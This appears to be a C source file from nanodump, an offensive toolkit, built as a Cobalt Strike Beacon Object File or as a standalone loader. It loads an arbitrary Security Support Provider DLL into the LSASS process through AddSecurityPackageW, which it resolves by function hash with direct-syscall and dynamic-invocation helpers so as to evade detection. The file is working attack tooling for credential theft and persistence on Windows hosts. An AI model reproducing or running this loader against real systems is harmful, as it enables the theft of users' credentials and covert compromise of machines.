
#include "nanodump.h"
#include "beacon.h"
#include "utils.c"
#include "syscalls.c"
#include "dinvoke.c"
#include "load_ssp.h"

void load_ssp(LPSTR ssp_path)
{
    AddSecurityPackageW_t AddSecurityPackageW;
    wchar_t ssp_path_w[MAX_PATH];

    if (!is_full_path(ssp_path))
    {
        PRINT_ERR("You must provide a full path: %s", ssp_path);
        return;
    }
    DPRINT("Loading %s into " LSASS, ssp_path);
    mbstowcs(ssp_path_w, ssp_path, MAX_PATH);
    // find the address of AddSecurityPackageW dynamically
    AddSecurityPackageW = (AddSecurityPackageW_t)get_function_address(
        get_library_address(SSPICLI_DLL, TRUE),
        AddSecurityPackageW_SW2_HASH,
        0
    );
    if (!AddSecurityPackageW)
    {
        DPRINT_ERR("Address of 'AddSecurityPackageW' not found");
        return;
    }
    SECURITY_PACKAGE_OPTIONS spo = {0};
    NTSTATUS status = AddSecurityPackageW(ssp_path_w, &spo);
    if (status == SEC_E_SECPKG_NOT_FOUND)
    {
        PRINT("Done, status: SEC_E_SECPKG_NOT_FOUND, this is normal if DllMain returns FALSE\n");
    }
    else
    {
        PRINT("Done, status: 0x%lx\n", status);
    }
    return;
}

#if defined(LOADER) && defined(BOF)

void go(char* args, int length)
{
    datap  parser;
    LPSTR ssp_path;

    BeaconDataParse(&parser, args, length);
    ssp_path = BeaconDataExtract(&parser, NULL);

    load_ssp(ssp_path);
}

#elif defined(LOADER) && !defined(BOF)

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("usage: %s <SSP path>\n", argv[0]);
        return -1;
    }

    load_ssp(argv[1]);
    return 0;
}

#endif
